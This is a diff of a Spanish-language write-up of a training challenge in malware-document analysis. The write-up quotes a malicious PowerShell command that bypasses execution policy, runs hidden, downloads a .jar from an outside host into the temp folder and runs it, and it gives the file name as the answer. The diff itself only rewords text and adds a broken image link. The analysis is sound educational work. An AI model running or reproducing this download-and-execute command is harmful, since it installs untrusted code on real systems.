@@ -82,10 +82,13 @@ Con la herramienta `powershell.exe`.
 
 Al analizar el archivo me encontre con un comando muy sospechoso de powershell, el cual era el siguiente:
 
+![Uploading image.png…]()
 
 ```
 /c powershell -executionpolicy bypass -W Hidden -command "& { (new-object System.Net.WebClient).DownloadFile(\"http://hocoso.mobi\" ,\" %temp%\\6LeGwKmrm.jar\") }" & %temp%\\6LeGwKmrm.jar
 ```
+
+
 
 ## Codigo explicado
 
@@ -101,12 +104,12 @@ Y por ultimo guarda el archivo descargado en la carpeta temporal del sistema (%T
 Por lo que la respuesta es: `6LeGwKmrm.jar`.
 
 
-- Al finalizar este ultimo reto me dieron la siguiente Certificacion:
+- Al finalizar con el ultimo reto del curso me dieron la siguiente Certificacion:
 
 ![Screenshot From 2025-01-18 19-08-41](https://github.com/user-attachments/assets/272dfc67-11c6-470d-bc43-44a67f5b4bee)
 
 
-Espero que hayan disfrutado mucho de este Writeup, se vienen mas!
+Espero que hayan aprendido mucho de este Writeup, se vienen mas!
 
 
 
